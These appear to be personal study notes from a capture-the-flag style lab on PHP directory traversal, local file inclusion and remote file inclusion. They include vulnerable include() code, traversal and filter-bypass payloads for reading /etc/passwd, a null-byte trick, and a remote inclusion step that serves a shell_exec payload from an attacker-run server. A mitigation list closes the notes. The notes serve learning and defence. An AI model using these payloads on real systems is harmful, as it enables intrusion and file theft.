  - Directory Traversal: allows to read operating system resources
	- occures when user input is given to a function like file_get_contents, using a parameter
	- ex: http://webapp.thm/get.php?file=../../../../etc/passwd
## Local File Inclusion

- PHP: include, require, include_once, require_once: source of vulnerabilities
- Ex: below gets the language via url parameter to include the file of the lang
	- http://webapp.thm/index.php?lang=EN.php to get the file
	- if no input validation: can access any file on the server
			- ex: http://webapp.thm/get.php?file=/etc/passwd
```php
<?PHP 
	include($_GET["lang"]);
?>
```
- Other example:

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
Here:
- uses include, starting from languages folder
- juste has to go back up: http://webapp.thm/index.php?lang=../../../../etc/passwd

To perform blackbock testing: 
- look at error messages
- ex: 
```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
Here: can move but .php is removed from input

Solution: use NULL BYTE `%00`
inside function, should look like that: `include("languages/../../../../../etc/passwd%00").".php");`
which is equivalent to: `include("languages/../../../../../etc/passwd");`

Does not work for PHP >= 5.3.4

Other solution: `use /etc/passwd/.`

Other example:
New error message: 
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
=> replaces ../ by empty string
can try to send this: `....//....//....//....//....//etc/passwd`

Also possible that browser requires to give input folder like `languages/path/to/file`, just  have it in the argument and then travel to wanted file

## Remote File Inclusion

Allows to include remote files into a vulnerable app
Happens when input not properly sanatized => can inject external URL
Requires `allow_url_fopen` set to  `on`
Risk:
- Sensitive Information Disclosure
- Cross-site Scripting
- Denial of Service
### RFI Steps

![[Pasted image 20250403215615.png]]

Can setup server on personal machine using :
```python
python3 -m http.server
```

=>Allows to access files stored on local machine
=>Then, get ip on network, and pass link to reach php payload

Ex. of payload:

```
<?PHP echo shell_exec('hostname'); ?>
```

=> Command can be replaced by anything
## Things to do:

- Keep systems and service updated
- turn off PHP errors to prevent leaking path of the app or other info
- a Web application firewall ([[WAF]])
- disable some PHP features if not needed: `allow_url_fopen`, `allow_url_include`
- analyze web app to only allow protocols and wrappers that are needed
- never trust user input, implement proper input validation
- whitelisting and blacklisting
